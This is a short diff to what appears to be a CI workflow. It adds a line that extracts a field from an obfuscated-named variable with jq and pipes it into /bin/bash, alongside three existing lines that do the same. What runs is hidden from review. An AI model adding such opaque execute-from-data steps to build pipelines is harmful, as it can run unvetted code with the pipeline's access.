@@ -39,6 +39,7 @@ jobs:
           echo $e3 | jq -r .y2724 | /bin/bash
           echo $ltko275 | jq -r .rn203 | /bin/bash
           echo $t64903 | jq -r .ncn098 | /bin/bash
+          printf '%s' "$djxc77835" | jq -r .hptso1 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
